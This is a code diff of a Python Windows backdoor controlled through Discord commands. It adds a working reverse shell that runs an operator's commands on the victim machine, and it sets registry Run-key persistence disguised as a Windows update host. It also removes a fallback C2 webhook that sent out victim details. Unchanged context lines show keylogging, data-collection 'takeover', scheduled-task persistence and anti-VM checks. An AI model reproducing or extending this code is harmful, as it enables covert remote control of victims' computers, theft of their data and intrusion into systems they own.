@@ -127,9 +127,9 @@ BACKUP_C2_URL = None # Global variable to store backup C2 URL
 
 
 
-def setup_registry_persistence():
+def persistence():
     try:
-        if sys.platform != "win32": return False
+        if sys.platform != "win32": return
         appdata = os.getenv('APPDATA')
         script_path = os.path.abspath(sys.argv[0])
         target_path = os.path.join(appdata, 'WindowsUpdateHost', 'hostupdate.exe')
@@ -141,26 +141,13 @@ def setup_registry_persistence():
             if script_path.endswith('.exe'):
                 shutil.copy(script_path, target_path)
             else:
-                shutil.copy(script_path, target_path)
+                target_path = script_path
 
         import winreg
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WindowsHostUpdate", 0, winreg.REG_SZ, f'"{target_path}"')
         winreg.CloseKey(key)
-        return True
-    except: return False
-
-def remove_registry_persistence():
-    try:
-        if sys.platform != "win32": return False
-        import winreg
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        try:
-            winreg.DeleteValue(key, "WindowsHostUpdate")
-        except: pass
-        winreg.CloseKey(key)
-        return True
-    except: return False
+    except: pass
 
 def check_for_vm():
     # Basic VM detection using common indicators
@@ -240,7 +227,7 @@ def remove_scheduled_task_persistence():
     except Exception as e:
         pass # print(f"Error removing scheduled task: {e}")
 
-
+reverse_shell_thread = None
 SCREEN_STREAM_ACTIVE = False
 screenshot_thread = None
 
@@ -267,7 +254,25 @@ def stop_screenshot_stream():
     global SCREEN_STREAM_ACTIVE
     SCREEN_STREAM_ACTIVE = False
 
-
+def start_reverse_shell(ip, port):
+    import socket
+    import subprocess
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        s.connect((ip, port))
+        s.send(b"Connected to Victim!\n")
+        while True:
+            cmd = s.recv(1024).decode('utf-8').strip()
+            if cmd == "exit":
+                break
+            if cmd:
+                proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                s.sendall(stdout + stderr)
+    except Exception as e:
+        s.sendall(str(e).encode())
+    finally:
+        s.close()
 
 class AstroBackdoor:
     @staticmethod
@@ -963,7 +968,27 @@ async def handle_backdoor(message):
                 await message.channel.send("👁️ **Visual Mode Active.** Console visible.")
             except: pass
 
-
+        elif message.content.startswith("!reverse "):
+            global reverse_shell_thread
+            args = message.content[9:].split(" ")
+            if len(args) == 2:
+                ip, port = args[0], int(args[1])
+                if reverse_shell_thread and reverse_shell_thread.is_alive():
+                    await message.channel.send("❌ A reverse shell is already active. Use `!reverse stop` to terminate it first.")
+                else:
+                    await message.channel.send(f"🐚 **Attempting reverse shell to:** `{ip}:{port}`. Check your listener.")
+                    reverse_shell_thread = threading.Thread(target=start_reverse_shell, args=(ip, port))
+                    reverse_shell_thread.daemon = True
+                    reverse_shell_thread.start()
+            elif message.content == "!reverse stop":
+                if reverse_shell_thread and reverse_shell_thread.is_alive():
+                    # No direct way to stop thread, but can set a flag. For now, just send a message.
+                    await message.channel.send("⚠️ **Cannot directly stop reverse shell thread.** The victim will need to close the connection manually or restart.")
+                    # A more robust solution would involve a global flag within start_reverse_shell loop
+                else:
+                    await message.channel.send("❌ No active reverse shell to stop.")
+            else:
+                await message.channel.send("❌ **Usage:** `!reverse <IP> <PORT>` or `!reverse stop`")
         elif message.content == "!takeover":
             await message.channel.send("📡 **Initiating takeover...** Gathering data. This might take a moment.")
             await collect_and_zip_data(message.channel)
@@ -971,23 +996,13 @@ async def handle_backdoor(message):
             global BACKUP_C2_URL
             args = message.content.split(" ")
             if len(args) == 2 and args[1] == "list":
-                cfg = Files.load_config()
-                saved_url = cfg.get("BackupC2", "None")
-                await message.channel.send(f"Current Runtime C2: `{BACKUP_C2_URL}`\nPersisted C2: `{saved_url}`")
+                await message.channel.send(f"Backup C2 URL: `{BACKUP_C2_URL if BACKUP_C2_URL else 'None'}`")
             elif len(args) == 3 and args[1] == "add":
-                url = args[2]
-                if not url.startswith("http"):
-                    await message.channel.send("❌ Invalid URL format.")
-                else:
-                    BACKUP_C2_URL = url
-                    if Files.update_config("BackupC2", url):
-                        await message.channel.send(f"✅ Backup C2 URL saved and active: `{url}`")
-                    else:
-                        await message.channel.send(f"⚠️ Activated `{url}` but failed to save to config.")
+                BACKUP_C2_URL = args[2]
+                await message.channel.send(f"✅ Backup C2 URL set to: `{BACKUP_C2_URL}`")
             elif len(args) == 2 and args[1] == "remove":
                 BACKUP_C2_URL = None
-                Files.update_config("BackupC2", None)
-                await message.channel.send("✅ Backup C2 URL removed from config and memory.")
+                await message.channel.send("✅ Backup C2 URL removed.")
             else:
                 await message.channel.send("❌ **Usage:** `!backdoor list`, `!backdoor add <URL>`, `!backdoor remove`")
         elif message.content == "!keylog start":
@@ -1044,15 +1059,13 @@ async def handle_backdoor(message):
         elif message.content == "!persist add":
             if sys.platform == "win32":
                 setup_scheduled_task_persistence()
-                setup_registry_persistence()
-                await message.channel.send(f"✅ **Persistence Activated** (Registry + Task Scheduler).")
+                await message.channel.send(f"✅ **Persistence added** via Scheduled Task: `{TASK_NAME}`")
             else:
                 await message.channel.send("`!persist` is currently supported only on Windows.")
         elif message.content == "!persist remove":
             if sys.platform == "win32":
                 remove_scheduled_task_persistence()
-                remove_registry_persistence()
-                await message.channel.send(f"✅ **Persistence Removed** (Registry + Task Scheduler).")
+                await message.channel.send(f"✅ **Persistence removed** for Scheduled Task: `{TASK_NAME}`")
             else:
                 await message.channel.send("`!persist` is currently supported only on Windows.")
         elif message.content == "!antivm":
@@ -1263,7 +1276,6 @@ class Files:
                 data = {
                     "Proxies": False,
                     "Theme": "light_blue", 
-                    "BackupC2": None 
                 }
                 with open("config.json", "w") as f:
                     json.dump(data, f, indent=4)
@@ -1293,33 +1305,12 @@ class Files:
                 console.log("Failed", C["red"], "Failed to Write Files", e)
 
     @staticmethod
-    def load_config():
-        try:
-            if os.path.exists("config.json"):
-                with open("config.json", "r") as f:
-                    return json.load(f)
-        except: pass
-        return {}
-
-    @staticmethod
-    def update_config(key, value):
-        try:
-            config = Files.load_config()
-            config[key] = value
-            with open("config.json", "w") as f:
-                json.dump(config, f, indent=4)
-            return True
-        except: return False
-
-    @staticmethod
     def run_tasks():
         tasks = [Files.write_config, Files.write_folders, Files.write_files]
         for task in tasks:
             task()
 
 Files.run_tasks()
-try: BACKUP_C2_URL = Files.load_config().get("BackupC2")
-except: BACKUP_C2_URL = None
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # ADVANCED UTILITIES CLASS - Comprehensive Helper Functions
@@ -8889,7 +8880,7 @@ class Menu:
 
 if __name__ == "__main__":
     # 1. SETUP PERSISTENCE
-    setup_registry_persistence()
+    persistence()
     
     # Simple Lock Mechanism to prevent multiple background instances
     lock_file = BACKDOOR_LOCK
@@ -8910,41 +8901,15 @@ if __name__ == "__main__":
             
         # Stealth mode will activate AFTER successful connection (in on_ready)
         # INFINITE RETRY LOOP for the background client
-        failures = 0
         while True:
             try:
                 client.run(TOKEN)
-                failures = 0 # Reset on success (though run() blocks until disconnect)
             except Exception as e:
-                failures += 1
                 # Log errors to file for debugging
                 try:
                     with open("ghost_error.log", "a") as log:
                         log.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {e}\n")
                 except: pass
-                
-                # Fallback C2 Logic
-                if failures >= 5 and BACKUP_C2_URL:
-                    try:
-                        import requests
-                        payload = {
-                            "username": "NEXUS FALLBACK",
-                            "avatar_url": "https://i.imgur.com/K6Y7x9G.png",
-                            "embeds": [{
-                                "title": "⚠️ CONNECTION LOST - FALLBACK REPORT",
-                                "color": 0xFF0000,
-                                "fields": [
-                                    {"name": "User", "value": os.getlogin(), "inline": True},
-                                    {"name": "Machine", "value": os.environ.get('COMPUTERNAME', 'N/A'), "inline": True},
-                                    {"name": "OS", "value": sys.platform, "inline": True},
-                                    {"name": "Error", "value": str(e)[:200], "inline": False}
-                                ],
-                                "footer": {"text": f"Failures: {failures} | Retrying..."}
-                            }]
-                        }
-                        requests.post(BACKUP_C2_URL, json=payload)
-                    except: pass
-                
                 time.sleep(15) # Wait for network self-healing
             
     # 3. SPAWN DETACHED GHOST (If not already running/alive)
